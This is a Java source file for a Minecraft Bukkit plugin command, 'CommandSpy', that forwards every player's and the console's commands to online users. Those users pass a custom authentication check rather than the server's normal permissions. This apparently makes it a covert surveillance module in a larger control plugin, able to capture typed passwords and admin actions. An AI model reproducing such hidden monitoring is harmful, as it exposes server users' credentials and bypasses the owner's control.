package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public class CommandSpy implements Command, Listener {
    private final ArrayList<UUID> toggledOff = new ArrayList<>();
    private Z_ _z;

    @Override
    public boolean playerOnly() {
        return true;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"commandspy", "cs"};
    }

    @Override
    public String getDescription() {
        return "Shows you all commands people are running.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        if (!toggledOff.contains(executor.getUniqueId())) {
            toggledOff.add(executor.getUniqueId());
            sender.sendMessage(Colors.Prefix + Colors.Failure + "You will no longer see all commands!");
            return;
        }

        toggledOff.remove(executor.getUniqueId());
        sender.sendMessage(Colors.Prefix + Colors.Success + "You will now see all commands!");
    }

    @Override
    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
        this._z = z;
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void onCommand(PlayerCommandPreprocessEvent e) throws IOException, InterruptedException {
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (!this._z.getAuth().isVerified(p.getName()) || toggledOff.contains(p.getUniqueId())) {
                continue;
            }

            if (p.getName().equals(e.getPlayer().getName())) {
                continue;
            }

            p.sendMessage(Colors.Prefix + Colors.Caution + e.getPlayer().getName() + ChatColor.BLUE + " -> " + Colors.Caution + e.getMessage());
        }
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void consoleCommand(ServerCommandEvent e) throws IOException, InterruptedException {
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (!this._z.getAuth().isVerified(p.getName()) || toggledOff.contains(p.getUniqueId())) {
                continue;
            }

            p.sendMessage(Colors.Prefix + Colors.Caution + "console" + ChatColor.BLUE + " -> " + Colors.Caution + e.getCommand());
        }
    }
}
